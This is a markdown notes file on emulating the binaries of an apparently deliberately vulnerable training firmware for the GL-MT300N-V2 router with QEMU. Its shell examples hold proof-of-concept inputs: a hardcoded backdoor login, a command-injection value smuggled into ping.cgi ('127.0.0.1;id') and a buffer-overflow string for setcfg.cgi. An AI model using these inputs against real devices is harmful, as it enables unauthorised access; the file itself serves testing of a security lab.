# Testing without hardware (QEMU / emulation notes)

The GL-MT300N-V2 is a MediaTek **MT7628 (ramips/mt76x8)** board. There is **no mature
QEMU machine for mt7628**, so full-system boot of OpenWrt on QEMU is not turn-key.
Practical options, cheapest first:

## 1. qemu-user on the CGI/daemon binaries (recommended for these bugs)
The custom binaries are static-ish, dynamically linked against the rootfs musl
(`/lib/ld-musl-mipsel-sf.so.1`). You can run them directly with `qemu-mipsel` and a fake
CGI environment. This exercises the real code paths (ping injection, view traversal,
setcfg overflow, authcheck backdoor) without a router.

```sh
brew install qemu                      # or: apt install qemu-user-static
R=../rootfs
# backdoor account (no HTTP needed):
qemu-mipsel -L "$R" "$R/usr/sbin/authcheck" support sup3rs3cr3t_backd00r
#   -> AUTH OK (backdoor)

# ping.cgi as a CGI (needs an HTTP-ish env). Force a difficulty cookie:
QUERY_STRING='host=127.0.0.1;id' REQUEST_METHOD=GET \
HTTP_COOKIE='difficulty=low' CONTENT_LENGTH=0 \
qemu-mipsel -L "$R" "$R/www/cgi-bin/ping.cgi"
#   -> ping output followed by the id output (command injection)

# setcfg.cgi overflow:
QUERY_STRING="name=$(printf 'A%.0s' $(seq 1 300))" REQUEST_METHOD=GET \
HTTP_COOKIE='difficulty=low' \
qemu-mipsel -L "$R" "$R/www/cgi-bin/setcfg.cgi"
```

If the loader complains, point `QEMU_LD_PREFIX` at the rootfs:
`QEMU_LD_PREFIX=$R qemu-mipsel ...`.

## 2. Flash a real GL-MT300N-V2 (or any MT7628 devkit)
Use the vendor/OpenWrt recovery (TFTP + `sysupgrade`) to flash the image, then point the
PoCs at `192.168.75.1`. This is the only way to validate the **network daemons**
(`upnpd`, `cwmpd`) and the **Wi-Fi/USB** paths (M10).

## 3. FirmAE / FAT
For full-system emulation of stock OpenWrt rootfs images, `FirmAE`/`FAT` can often boot a
MIPS rootfs under a generic kernel (they patch `init` and network). Support for ramips is
hit-or-miss; use it if you want to drive the **uhttpd + CGI** surface over a socket.

## What cannot be validated statically
- **M2 upnpd** and **M3 cwmpd** need the daemons running (full system or real device).
- **M10 USB** needs a physical USB port.
- The **M4 overflow** root-code-execution chain needs a target-specific ROP/JOP gadget
  set and the live stack — the PoC only proves the unsafe copy.
